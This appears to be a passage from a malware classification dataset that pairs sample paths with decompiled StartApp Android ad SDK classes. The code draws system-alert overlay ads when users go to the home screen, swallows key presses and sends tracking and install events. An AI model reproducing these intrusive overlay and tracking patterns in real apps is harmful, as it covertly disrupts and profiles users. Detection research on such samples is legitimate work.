com.startapp.android.publish.adinformation.b bVar=new com.startapp.android.publish.adinformation.b(getContext(),b.EnumC0051b.LARGE,this.m,this.l);     bVar.a(b.a.LAYOUT);     bVar.a(relativeLayout);     addView(relativeLayout);     this.g=o.a(getContext());     addView(this.g);     this.g.setVisibility(8);   }   public void d(){     getContext().sendBroadcast(new Intent(""com.startapp.android.publish.DISMISS_ACTIVITY""));     a=true;   }   public long e(){     long currentTimeMillis=System.currentTimeMillis() - this.h;     i.a(2,""MyWebViewClient::shouldOverrideUrlLoading - timeDiff=["" + currentTimeMillis + ""]"");     long j=0;     if (currentTimeMillis < 5000) {       j=5000 - currentTimeMillis;       if (this.g.getVisibility() != 0) {         this.g.setVisibility(0);       }     }     return j;   }   public void a(){     d();     i.a(2,""MyWebViewClient::hide - current time ["" + System.currentTimeMillis() + ""]"");     try {       this.c.removeView(this);       getContext().unregisterReceiver(d);     }  catch (    RuntimeException e) {     }     com.startapp.android.publish.e.c.a(getContext());   }   public void a(  int i){     i.a(2,""MyWebViewClient::delay hide - current time ["" + i + ""]"");     postDelayed(new Runnable(){       @Override public void run(){         c.this.a();       }     } ,i);   }   public void b(){     a=false;     c();     setFocusable(true);     setFocusableInTouchMode(true);     setOnKeyListener(new View.OnKeyListener(){       @Override public boolean onKey(      View view,      int i,      KeyEvent keyEvent){         c.this.a();         return true;       }     } );     this.k=new c.a(){       @Override public void a(      int i){         if (i == 80) {           i.a(4,""onTrimMemory: ["" + i + ""]"");           c.this.a();         }       }     } ;     com.startapp.android.publish.e.c.a(getContext(),this.k);     getContext().registerReceiver(d,new IntentFilter(""com.startapp.android.publish.DISMISS_OVERLAY""));     getContext().registerReceiver(d,new IntentFilter(""android.intent.action.CLOSE_SYSTEM_DIALOGS""));     if (this.e != null) {       for (int i=0; i < this.e.length; i++) {         p.a(getContext(),this.e[i]);       }     }     this.h=System.currentTimeMillis();     i.a(2,""OverlayHtml::show - startShowTime=["" + this.h + ""]"");   }   @Override public boolean dispatchKeyShortcutEvent(  KeyEvent keyEvent){     return super.dispatchKeyShortcutEvent(keyEvent);   }   public WindowManager.LayoutParams getWmParams(){     WindowManager.LayoutParams layoutParams=new WindowManager.LayoutParams();     layoutParams.height=-1;     layoutParams.width=-1;     layoutParams.alpha=1.0f;     layoutParams.format=1;     layoutParams.type=2002;     layoutParams.flags=R.string.config_defaultBrowser;     return layoutParams;   }   public void setAdInfoOverride(  AdInformationOverrides adInformationOverrides){     this.l=adInformationOverrides;   }   public void setHtml(  String str){     this.j=str;   }   public void setPlacement(  AdPreferences.Placement placement){     this.m=placement;   }   public void setSmartRedirect(  boolean[] zArr){     this.f=zArr;   }   public void setTrackingUrl(  String[] strArr){     this.e=strArr;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish\HtmlAd.code","@Deprecated public class HtmlAd extends d {   public HtmlAd(  Context context){     super(context);   }   @Override protected void loadAds(  AdPreferences adPreferences,  AdEventListener adEventListener){     new g(this.context,this,adPreferences,adEventListener).execute(new Void[0]);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish\JsInterface.code","public class JsInterface {   private Runnable clickCallback;   private Runnable closeCallback;   private Context mContext;   private boolean processed;   public JsInterface(  Context context,  Runnable runnable){     this.processed=false;     this.closeCallback=null;     this.clickCallback=null;     this.closeCallback=runnable;     this.mContext=context;   }   public JsInterface(  Context context,  Runnable runnable,  Runnable runnable2){     this(context,runnable);     this.clickCallback=runnable2;   }   @JavascriptInterface public void closeAd(){     if (this.processed) {       return;     }     this.processed=true;     this.closeCallback.run();   }   @JavascriptInterface public void openApp(  String str,  String str2,  String str3){     if (str != null && !TextUtils.isEmpty(str)) {       p.a(this.mContext,str);     }     Intent launchIntentForPackage=this.mContext.getPackageManager().getLaunchIntentForPackage(str2);     if (str3 != null) {       try {         JSONObject jSONObject=new JSONObject(str3);         Iterator<String> keys=jSONObject.keys();         while (keys.hasNext()) {           String valueOf=String.valueOf(keys.next());           launchIntentForPackage.putExtra(valueOf,String.valueOf(jSONObject.get(valueOf)));         }       }  catch (      JSONException e) {         i.a(6,""Couldn't parse intent details json!"",e);       }     }     this.mContext.startActivity(launchIntentForPackage);     if (this.clickCallback != null) {       this.clickCallback.run();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish\StartAppAd.code","public class StartAppAd extends Ad {   private static final String TAG=""StartAppAd"";   private static boolean testMode=false;   private Ad ad;   private AdMode adMode;   private AdDisplayListener callback;   private BroadcastReceiver callbackBroadcastReceiver;   private boolean forceFullpage;   private boolean forceOfferWall2D;   private boolean forceOfferWall3D;   private boolean forceOverlay;   public enum AdMode {  AUTOMATIC,   FULLPAGE,   OFFERWALL,   OVERLAY} private class a implements AdEventListener {     private AdEventListener c;     private boolean b=false;     private boolean d=false;     public a(    AdEventListener adEventListener){       this.c=null;       this.c=adEventListener;     }     @Override public void onFailedToReceiveAd(    Ad ad){       if (!this.d) {         this.c.onFailedToReceiveAd(StartAppAd.this);       }       this.d=true;     }     @Override public void onReceiveAd(    Ad ad){       if (this.b) {         return;       }       this.b=true;       this.c.onReceiveAd(StartAppAd.this);     }   }   public StartAppAd(  Context context){     super(context);     this.ad=null;     this.forceOfferWall3D=false;     this.forceOfferWall2D=false;     this.forceFullpage=false;     this.forceOverlay=false;     this.adMode=AdMode.AUTOMATIC;     this.callback=null;     this.callbackBroadcastReceiver=new BroadcastReceiver(){       @Override public void onReceive(      Context context2,      Intent intent){         if (StartAppAd.this.callback != null) {           StartAppAd.this.callback.adHidden(StartAppAd.this);         }         context2.unregisterReceiver(this);       }     } ;   }   private void createFullpageSelection(){     if ((new Random().nextInt(100) < MetaData.INSTANCE.getFullscreenOverlayProbability(this.context) || this.forceFullpage) && !this.forceOverlay) {       this.ad=new com.startapp.android.publish.a.c(this.context);     }  else {       this.ad=new j(this.context);     }   }   private void createOfferwallSelection(){     if ((new Random().nextInt(100) < MetaData.INSTANCE.getProbability3D(this.context) || this.forceOfferWall3D) && !this.forceOfferWall2D) {       this.ad=new h(this.context);     }  else {       this.ad=new i(this.context);     }   }   public static void init(  Context context,  String str,  String str2){     com.startapp.android.publish.e.i.a(TAG,3,""StartAppAd init with devId:["" + str + ""], appId:[""+ str2+ ""]"");     p.a(context,str,str2);     sendDownloadEvent(context);   }   private static void sendDownloadEvent(  final Context context){     boolean booleanValue=g.a(context,""shared_prefs_first_init"",(Boolean)true).booleanValue();     com.startapp.android.publish.e.i.a(TAG,3,""First Initialization: ["" + booleanValue + ""]"");     if (booleanValue) {       com.startapp.android.publish.e.i.a(TAG,3,""Sending Download Event"");       new AsyncTask<Void,Void,Void>(){         @Override public Void doInBackground(        Void... voidArr){           try {             SdkDownloadRequest sdkDownloadRequest=new SdkDownloadRequest();             AdPreferences adPreferences=new AdPreferences();             p.a(context,adPreferences);             sdkDownloadRequest.fillApplicationDetails(context,adPreferences);             com.startapp.android.publish.d.b.a(context,b.a(b.a.DOWNLOAD),sdkDownloadRequest,null);           }  catch (          n e) {             com.startapp.android.publish.e.i.a(6,""Error occured while sending download event"",e);           }           return null;         }       } .execute(new Void[0]);       g.b(context,""shared_prefs_first_init"",(Boolean)false);     }   }   private void setAdMode(  AdMode adMode){     this.adMode=adMode;   }   public static void showSlider(  Activity activity){     new com.startapp.android.publish.slider.b(activity);   }   public static void showSlider(  Activity activity,  AdPreferences adPreferences){     new com.startapp.android.publish.slider.b(activity,adPreferences);   }   public static void showSplash(  Activity activity,  Bundle bundle){     showSplash(activity,bundle,new SplashConfig());   }   public static void showSplash(  Activity activity,  Bundle bundle,  AdPreferences adPreferences){     showSplash(activity,bundle,new SplashConfig(),adPreferences);   }   public static void showSplash(  Activity activity,  Bundle bundle,  SplashConfig splashConfig){     showSplash(activity,bundle,splashConfig,new AdPreferences());   }   public static void showSplash(  Activity activity,  Bundle bundle,  SplashConfig splashConfig,  AdPreferences adPreferences){     showSplash(activity,bundle,splashConfig,adPreferences,null);   }   public static void showSplash(  final Activity activity,  Bundle bundle,  SplashConfig splashConfig,  AdPreferences adPreferences,  final SplashHideListener splashHideListener){     if (bundle == null) {       splashConfig.setDefaults(activity);       Intent intent=new Intent(activity,(Class<?>)AppWallActivity.class);       intent.putExtra(MetaData.KEY_SPLASH_CONFIG,splashConfig);       intent.putExtra(""AdPreference"",adPreferences);       intent.putExtra(""testMode"",testMode);       intent.putExtra(""placement"",AdPreferences.Placement.INAPP_SPLASH.getIndex());       intent.addFlags(1140883456);       activity.startActivity(intent);       activity.getApplicationContext().registerReceiver(new BroadcastReceiver(){         @Override public void onReceive(        Context context,        Intent intent2){           if (SplashHideListener.this != null) {             SplashHideListener.this.splashHidden();           }           activity.getApplicationContext().unregisterReceiver(this);         }       } ,new IntentFilter(""com.startapp.android.splashHidden""));     }   }   public void close(){     if (this.callbackBroadcastReceiver != null) {       try {         this.context.unregisterReceiver(this.callbackBroadcastReceiver);       }  catch (      IllegalArgumentException e) {       }     }     this.context.sendBroadcast(new Intent(""com.startapp.android.CloseAdActivity""));   }   @Override public boolean doHome(){     if (this.ad == null || !this.ad.doHome()) {       return false;     }     this.ad=null;     return true;   }   @Override public boolean isReady(){     if (this.ad != null) {       return this.ad.isReady();     }     return false;   }   @Override @Deprecated public boolean load(  AdPreferences adPreferences,  AdEventListener adEventListener){     if (this.adMode == AdMode.AUTOMATIC && this.ad != null) {       if (adEventListener != null) {         adEventListener.onReceiveAd(this);       }       return true;     }     p.a(this.context,adPreferences);     if (!p.a(this.context)) {       return false;     }     setState(Ad.AdState.UN_INITIALIZED);     return super.load(adPreferences,adEventListener);   }   public void loadAd(){     loadAd(AdMode.AUTOMATIC,new AdPreferences(),null);   }   public void loadAd(  AdEventListener adEventListener){     loadAd(AdMode.AUTOMATIC,new AdPreferences(),adEventListener);   }   public void loadAd(  AdMode adMode){     loadAd(adMode,new AdPreferences(),null);   }   public void loadAd(  AdMode adMode,  AdEventListener adEventListener){     loadAd(adMode,new AdPreferences(),adEventListener);   }   public void loadAd(  AdMode adMode,  AdPreferences adPreferences){     loadAd(adMode,adPreferences,null);   }   public void loadAd(  AdMode adMode,  AdPreferences adPreferences,  AdEventListener adEventListener){     setAdMode(adMode);     load(adPreferences,adEventListener);   }   public void loadAd(  AdPreferences adPreferences){     loadAd(AdMode.AUTOMATIC,adPreferences,null);   }   public void loadAd(  AdPreferences adPreferences,  AdEventListener adEventListener){     loadAd(AdMode.AUTOMATIC,adPreferences,adEventListener);   }   @Override protected void loadAds(  AdPreferences adPreferences,  AdEventListener adEventListener){     a aVar=adEventListener != null ? new a(adEventListener) : null; switch (this.adMode) { case AUTOMATIC:       if (new Random().nextInt(100) >= MetaData.INSTANCE.getHtml3DProbability(this.context)) {         createOfferwallSelection();         break;       }  else {         createFullpageSelection();         break;       } case FULLPAGE:     this.ad=new com.startapp.android.publish.a.c(this.context);   break; case OVERLAY: this.ad=new j(this.context); break; case OFFERWALL: createOfferwallSelection(); break; } this.ad.load(adPreferences,aVar); com.startapp.android.publish.e.i.a(4,""ad Type: ["" + this.ad.getClass().toString() + ""]""); } public void loadSplash(AdPreferences adPreferences,AdEventListener adEventListener){ this.ad=new l(this.context); this.ad.load(adPreferences,adEventListener); } public void onBackPressed(){ showAd(); } public void onPause(){ doHome(); } public void onRestoreInstanceState(Bundle bundle){ int i=bundle.getInt(""AdMode""); this.adMode=AdMode.AUTOMATIC; if (i == 1) { this.adMode=AdMode.FULLPAGE; }  else if (i == 2) { this.adMode=AdMode.OFFERWALL; } load(); } public void onResume(){ if (isReady()) { return; } loadAd(); } public void onSaveInstanceState(Bundle bundle){ int i=0; switch (this.adMode) { case FULLPAGE: i=1; break; case OFFERWALL: i=2; break; } bundle.putInt(""AdMode"",i); } @Override @Deprecated public boolean show(){ return show(null); } @Deprecated public boolean show(AdDisplayListener adDisplayListener){ boolean z=false; this.callback=adDisplayListener; if (this.ad != null && this.ad.show()) { this.ad=null; z=true; } if (this.callback != null && z) { this.callback.adDisplayed(this); this.context.getApplicationContext().registerReceiver(this.callbackBroadcastReceiver,new IntentFilter(""com.startapp.android.HideDisplayBroadcastListener"")); } return z; } public boolean showAd(){ return showAd(null); } public boolean showAd(AdDisplayListener adDisplayListener){ return show(adDisplayListener); } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.a\a.code","public class a extends f {   public a(  Context context){     super(context);   }   @Override protected void loadAds(  AdPreferences adPreferences,  AdEventListener adEventListener){     new com.startapp.android.publish.c.e(this.context,this,adPreferences,adEventListener).execute(new Void[0]);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.a\b.code","public class b extends d {   private int a;   public b(  Context context){     super(context);     this.a=0;   }   @Override protected void loadAds(  AdPreferences adPreferences,  AdEventListener adEventListener){     new com.startapp.android.publish.c.f(this.context,this,this.a,adPreferences,adEventListener).execute(new Void[0]);     this.a++;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.a\c.code","public class c extends e {   public c(  Context context){     super(context);     setPlacement(AdPreferences.Placement.INAPP_FULL_SCREEN);   }   @Override protected void loadAds(  AdPreferences adPreferences,  AdEventListener adEventListener){     new com.startapp.android.publish.c.g(this.context,this,adPreferences,adEventListener).execute(new Void[0]);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.a\d.code","public abstract class d extends Ad {   protected static String launcherName=null;   private String adId;   public List<com.startapp.android.publish.a> apps;   private int height;   private String html;   public boolean[] smartRedirect;   public String[] trackingUrl;   private int width;   public d(  Context context){     super(context);     this.html="""";     this.adId=null;     this.smartRedirect=new boolean[]{false};     this.trackingUrl=new String[]{""""};     if (launcherName == null) {       initDefaultLauncherName();     }   }   private void initDefaultLauncherName(){     Intent intent=new Intent();     intent.setAction(""android.intent.action.MAIN"");     intent.addCategory(""android.intent.category.HOME"");     ResolveInfo resolveActivity=this.context.getPackageManager().resolveActivity(intent,0);     if (resolveActivity == null || resolveActivity.activityInfo == null) {       return;     }     launcherName=resolveActivity.activityInfo.packageName;     if (launcherName != null) {       launcherName=launcherName.toLowerCase();     }   }   private void setAdInfoEnableOverride(  String str){     getAdInfoOverride().a(Boolean.parseBoolean(str));   }   private void setAdInfoPositionOverrid(  String str){     getAdInfoOverride().a(c.a.a(str));   }   private void setSmartRedirect(  String str){     String[] split=str.split("","");     this.smartRedirect=new boolean[split.length];     for (int i=0; i < split.length; i++) {       if (split[i].compareTo(""true"") == 0) {         this.smartRedirect[i]=true;       }  else {         this.smartRedirect[i]=false;       }     }   }   private void setTrackingUrl(  String str){     this.trackingUrl=str.split("","");   }   public int getHeight(){     return this.height;   }   public String getHtml(){     return this.html;   }   public String getLauncherName(){     return launcherName;   }   public AdPreferences.Placement getPlacement(){     return this.placement;   }   public boolean getSmartRedirect(  int i){     if (i < 0 || i >= this.smartRedirect.length) {       return false;     }     return this.smartRedirect[i];   }   public boolean[] getSmartRedirect(){     return this.smartRedirect;   }   public String getTrackingUrls(  int i){     if (i < 0 || i >= this.trackingUrl.length) {       return null;     }     return this.trackingUrl[i];   }   public String[] getTrackingUrls(){     return this.trackingUrl;   }   public int getWidth(){     return this.width;   }   public String gtAdId(){     if (this.adId == null) {       this.adId=p.a(getHtml(),""@adId@"",""@adId@"");     }     return this.adId;   }   public void setHeight(  int i){     this.height=i;   }   public void setHtml(  String str){     this.html=str;     String a=p.a(str,""@smartRedirect@"",""@smartRedirect@"");     if (a != null) {       setSmartRedirect(a);     }     String a2=p.a(str,""@tracking@"",""@tracking@"");     if (a2 != null) {       setTrackingUrl(a2);     }     String a3=p.a(str,""@adInfoEnable@"",""@adInfoEnable@"");     if (a3 != null) {       setAdInfoEnableOverride(a3);     }     String a4=p.a(str,""@adInfoPosition@"",""@adInfoPosition@"");     if (a4 != null) {       setAdInfoPositionOverrid(a4);     }     if (this.smartRedirect.length < this.trackingUrl.length) {       com.startapp.android.publish.e.i.a(6,""Error in smartRedirect array in HTML"");       boolean[] zArr=new boolean[this.trackingUrl.length];       int i=0;       while (i < this.smartRedirect.length) {         zArr[i]=this.smartRedirect[i];         i++;       }       while (i < this.trackingUrl.length) {         zArr[i]=false;         i++;       }       this.smartRedirect=zArr;     }   }   public void setPlacement(  AdPreferences.Placement placement){     this.placement=placement;   }   public void setSize(  int i,  int i2){     setWidth(i);     setHeight(i2);   }   public void setWidth(  int i){     this.width=i;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.a\e.code","public abstract class e extends d {   public e(  Context context){     super(context);   }   @Override public boolean doHome(){     boolean a=com.startapp.android.publish.e.c.a(this.context,launcherName);     boolean a2=p.a(this.context.getApplicationContext());     if (!a || !a2 || !isReady()) {       return false;     }     String[] trackingUrls=getTrackingUrls();     String d=p.d();     for (int i=0; i < trackingUrls.length; i++) {       trackingUrls[i]=trackingUrls[i] + d;     }     com.startapp.android.publish.c cVar=new com.startapp.android.publish.c(this.context.getApplicationContext());     cVar.setHtml(getHtml());     cVar.setTrackingUrl(trackingUrls);     cVar.setSmartRedirect(this.smartRedirect);     cVar.setPlacement(getPlacement());     cVar.setAdInfoOverride(getAdInfoOverride());     cVar.b();     return true;   }   @Override public String getLauncherName(){     return super.getLauncherName();   }   @Override public boolean show(){     if (!p.a(this.context) || !isReady()) {       return false;     }     Intent intent=new Intent(this.context,(Class<?>)AppWallActivity.class);     intent.putExtra(""fileUrl"",""exit.html"");     String[] trackingUrls=getTrackingUrls();     String d=p.d();     for (int i=0; i < trackingUrls.length; i++) {       trackingUrls[i]=trackingUrls[i] + d;     }     intent.putExtra(""tracking"",trackingUrls);     intent.putExtra(""html"",getHtml());     intent.putExtra(""smartRedirect"",this.smartRedirect);     intent.putExtra(""placement"",this.placement.getIndex());     intent.putExtra(""adInfoOverride"",getAdInfoOverride());     intent.putExtra(""orientation"",this.context.getResources().getConfiguration().orientation);     if (this instanceof l) {       intent.putExtra(""isSplash"",true);     }     intent.putExtra(""position"",d);     intent.addFlags(344457216);     this.context.startActivity(intent);     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.a\f.code","public abstract class f extends Ad {   public List<com.startapp.android.publish.a> a;   private List<AdDetails> b;   public f(  Context context){     super(context);     this.b=null;   }   public List<AdDetails> a(){     return this.b;   }   public void a(  List<AdDetails> list){     this.b=list;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.a\g.code","public class g extends f {   private NativeAdPreferences b;   public g(  Context context,  NativeAdPreferences nativeAdPreferences){     super(context);     this.b=nativeAdPreferences;   }   @Override protected void loadAds(  AdPreferences adPreferences,  AdEventListener adEventListener){     new com.startapp.android.publish.c.i(this.context,this,adPreferences,adEventListener,this.b).execute(new Void[0]);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.a\h.code","public class h extends f {   private static String b=null;   public h(  Context context){     super(context);     if (b == null) {       b();     }   }   private void b(){     Intent intent=new Intent();     intent.setAction(""android.intent.action.MAIN"");     intent.addCategory(""android.intent.category.HOME"");     ResolveInfo resolveActivity=this.context.getPackageManager().resolveActivity(intent,0);     if (resolveActivity == null || resolveActivity.activityInfo == null) {       return;     }     b=resolveActivity.activityInfo.packageName;     if (b != null) {       b=b.toLowerCase();     }   }   @Override public boolean doHome(){     boolean a=com.startapp.android.publish.e.c.a(this.context,b);     boolean a2=p.a(this.context.getApplicationContext());     if (!a || !a2 || !isReady()) {       return false;     }     com.startapp.android.publish.list3d.e.INSTANCE.a(p.d());     com.startapp.android.publish.list3d.g gVar=new com.startapp.android.publish.list3d.g(this.context.getApplicationContext());     gVar.setAdInfoOverride(getAdInfoOverride());     gVar.b();     return true;   }   @Override protected void loadAds(  AdPreferences adPreferences,  AdEventListener adEventListener){     new com.startapp.android.publish.c.k(this.context,this,adPreferences,adEventListener).execute(new Void[0]);   }   @Override public boolean show(){     if (!p.a(this.context) || !isReady()) {       return false;     }     com.startapp.android.publish.list3d.e.INSTANCE.a(p.d());     Intent intent=new Intent(this.context,(Class<?>)List3DActivity.class);     intent.putExtra(""adInfoOverride"",getAdInfoOverride());     intent.addFlags(1418199040);     this.context.startActivity(intent);     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.a\i.code","public class i extends e {   public i(  Context context){     super(context);     setPlacement(AdPreferences.Placement.INAPP_OFFER_WALL);   }   @Override protected void loadAds(  AdPreferences adPreferences,  AdEventListener adEventListener){     new com.startapp.android.publish.c.j(this.context,this,adPreferences,adEventListener).execute(new Void[0]);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.a\j.code","public class j extends e {   public j(  Context context){     super(context);     setPlacement(AdPreferences.Placement.INAPP_OVERLAY);   }   @Override protected void loadAds(  AdPreferences adPreferences,  AdEventListener adEventListener){     new com.startapp.android.publish.c.l(this.context,this,adPreferences,adEventListener).execute(new Void[0]);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.a\k.code","public class k extends f {   private List<AdDetails> b;   public k(  Activity activity){     super(activity);     this.b=null;   }   @Override public List<AdDetails> a(){     return this.b;   }   public void a(  AdPreferences adPreferences,  AdEventListener adEventListener){     load(adPreferences,adEventListener);   }   @Override public void a(  List<AdDetails> list){     this.b=list;   }   @Override public boolean load(  AdPreferences adPreferences,  AdEventListener adEventListener){     return super.load(adPreferences,adEventListener,false);   }   @Override protected void loadAds(  AdPreferences adPreferences,  AdEventListener adEventListener){     new m((Activity)this.context,this,adPreferences,adEventListener).execute(new Void[0]);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.a\l.code","public class l extends e {   public l(  Context context){     super(context);     setPlacement(AdPreferences.Placement.INAPP_OVERLAY);   }   @Override @Deprecated public boolean load(  AdPreferences adPreferences,  AdEventListener adEventListener){     return super.load(adPreferences,adEventListener,false);   }   @Override protected void loadAds(  AdPreferences adPreferences,  AdEventListener adEventListener){     new n(this.context,this,adPreferences,adEventListener).execute(new Void[0]);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.adinformation\a.code","public class a implements JsonDeserializer {   private boolean a=true;   private float b=2.0f;   private String c=""http://d1byvlfiet2h9q.cloudfront.net/InApp/resources/adInformationDialog3.html"";   private f d=f.a();   private c e=c.a();   private HashMap<EnumC0050a,e> f=new HashMap<>();   public enum EnumC0050a {  INFO_S(17,14),   INFO_EX_S(88,14),   INFO_L(25,21),   INFO_EX_L(130,21);   private int e;   private int f;   EnumC0050a(  int i,  int i2){     this.e=i;     this.f=i2;   }   public static EnumC0050a a(  String str){     EnumC0050a enumC0050a=INFO_S;     EnumC0050a[] values=values();     for (int i=0; i < values.length; i++) {       if (values[i].name().toLowerCase().compareTo(str.toLowerCase()) == 0) {         enumC0050a=values[i];       }     }     return enumC0050a;   }   public int a(){     return this.e;   }   public int b(){     return this.f;   } }   private a(){   }   public static a a(){     return a((JSONObject)null);   }   public static a a(  SharedPreferences sharedPreferences){     a aVar=new a();     aVar.a(sharedPreferences.getBoolean(""AdInformation.enabled"",true));     aVar.a(sharedPreferences.getFloat(""AdInformation.fatFingersFactor"",2.0f));     aVar.a(sharedPreferences.getString(""AdInformation.dialogUrl"",""http://d1byvlfiet2h9q.cloudfront.net/InApp/resources/adInformationDialog3.html""));     aVar.a(f.a(sharedPreferences));     aVar.a(c.a(sharedPreferences));     aVar.h();     for (    EnumC0050a enumC0050a : EnumC0050a.values()) {       e a=e.a(enumC0050a.name(),sharedPreferences);       if (a != null) {         aVar.a(enumC0050a,a);       }     }     aVar.g();     return aVar;   }   public static a a(  JSONObject jSONObject){     a aVar=new a();     a(aVar);     if (jSONObject != null) {       aVar.fromJson(jSONObject);     }     return aVar;   }   private static void a(  a aVar){     aVar.h();   }   public e a(  EnumC0050a enumC0050a){     return this.f.get(enumC0050a);   }   protected void a(  float f){     this.b=f;   }   public void a(  Context context,  boolean z){     g.b(context,""userDisabledAdInformation"",Boolean.valueOf(!z));   }   public void a(  SharedPreferences.Editor editor){     editor.putBoolean(""AdInformation.enabled"",b());     editor.putFloat(""AdInformation.fatFingersFactor"",c());     editor.putString(""AdInformation.dialogUrl"",d());     e().a(editor);     f().a(editor);     for (    EnumC0050a enumC0050a : EnumC0050a.values()) {       a(enumC0050a).a(editor);     }   }   protected void a(  EnumC0050a enumC0050a,  e eVar){     this.f.put(enumC0050a,eVar);   }   protected void a(  c cVar){     this.e=cVar;   }   protected void a(  f fVar){     this.d=fVar;   }   protected void a(  String str){     this.c=str;   }   protected void a(  boolean z){     this.a=z;   }   public boolean a(  Context context){     return !g.a(context,""userDisabledAdInformation"",(Boolean)false).booleanValue() && b();   }   public boolean b(){     return this.a;   }   public float c(){     return this.b;   }   public String d(){     return this.c;   }   public f e(){     return this.d;   }   public c f(){     return this.e;   }   @Override public void fromJson(  JSONObject jSONObject){     try {       i.a(3,""========= AdInformationConfig ========"");       a(jSONObject.getBoolean(""enabled""));       i.a(3,""Enabled: ["" + b() + ""]"");       a(jSONObject.getInt(""fatFingersFactor"") / 100.0f);       i.a(3,""FatFingers: ["" + c() + ""]"");       a(jSONObject.getString(""dialogUrl""));       i.a(3,""Dialog URL: ["" + d() + ""]"");       this.d.fromJson(jSONObject.getJSONObject(""SimpleToken""));       this.e.fromJson(jSONObject.getJSONObject(""Positions""));       JSONArray jSONArray=jSONObject.getJSONArray(""ImageResources"");       for (int i=0; i < jSONArray.length(); i++) {         e a=e.a(jSONArray.getJSONObject(i));         this.f.put(EnumC0050a.a(a.a()),a);       }       h();       g();       i.a(3,""========= End of AdInformationConfig ========"");     }  catch (    JSONException e) {       throw new IllegalArgumentException(""Cannot find mandatory propreties of AdInformation in MetaData"",e);     }   }   protected void g(){     for (    EnumC0050a enumC0050a : EnumC0050a.values()) {       if (this.f.get(enumC0050a) == null) {         throw new IllegalArgumentException(""AdInformation error in ImageResource ["" + enumC0050a + ""] cannot be found in MetaData"");       }     }   }   protected void h(){     for (    EnumC0050a enumC0050a : EnumC0050a.values()) {       e eVar=this.f.get(enumC0050a);       if (eVar == null) {         eVar=e.d(enumC0050a.name());         this.f.put(enumC0050a,eVar);       }       eVar.a(enumC0050a.a());       eVar.b(enumC0050a.b());       eVar.b(enumC0050a.name().toLowerCase() + "".png"");     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.adinformation\AdInformationJsInterface.code","public class AdInformationJsInterface {   private Runnable acceptCallback;   private Runnable declineCallback;   private boolean processed=false;   public AdInformationJsInterface(  Runnable runnable,  Runnable runnable2){     this.declineCallback=null;     this.acceptCallback=null;     this.acceptCallback=runnable;     this.declineCallback=runnable2;   }   @JavascriptInterface public void accept(){     if (this.processed) {       return;     }     this.processed=true;     this.acceptCallback.run();   }   @JavascriptInterface public void decline(){     if (this.processed) {       return;     }     this.processed=true;     this.declineCallback.run();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.adinformation\AdInformationOverrides.code","public class AdInformationOverrides implements Parcelable {   public static final Parcelable.Creator<AdInformationOverrides> CREATOR=new Parcelable.Creator<AdInformationOverrides>(){     @Override public AdInformationOverrides createFromParcel(    Parcel parcel){       return new AdInformationOverrides(parcel);     }     @Override public AdInformationOverrides[] newArray(    int i){       return new AdInformationOverrides[i];     }   } ;   private boolean a;   private boolean b;   private boolean c;   private c.a d;   private AdInformationOverrides(){     this.a=false;     this.b=true;     this.c=false;     this.d=c.a.a(c.a);   }   public AdInformationOverrides(  Parcel parcel){     this.a=false;     this.b=true;     this.c=false;     this.d=c.a.a(c.a);     this.a=a(parcel);     this.b=a(parcel);     this.c=a(parcel);     this.d=c.a.a(parcel.readInt());   }   public static AdInformationOverrides a(){     return new AdInformationOverrides();   }   private void a(  Parcel parcel,  boolean z){     parcel.writeBooleanArray(new boolean[]{z});   }   private boolean a(  Parcel parcel){     boolean[] zArr=new boolean[1];     parcel.readBooleanArray(zArr);     return zArr[0];   }   public void a(  c.a aVar){     this.d=aVar;     if (aVar != null) {       this.c=true;     }  else {       this.c=false;     }   }   public void a(  boolean z){     this.b=z;     this.a=true;   }   public boolean b(){     return this.b;   }   public c.a c(){     return this.d;   }   public boolean d(){     return this.c;   }   @Override public int describeContents(){     return 0;   }   public boolean e(){     return this.a;   }   @Override public void writeToParcel(  Parcel parcel,  int i){     a(parcel,e());     a(parcel,b());     a(parcel,d());     parcel.writeInt(c().a());   } } "
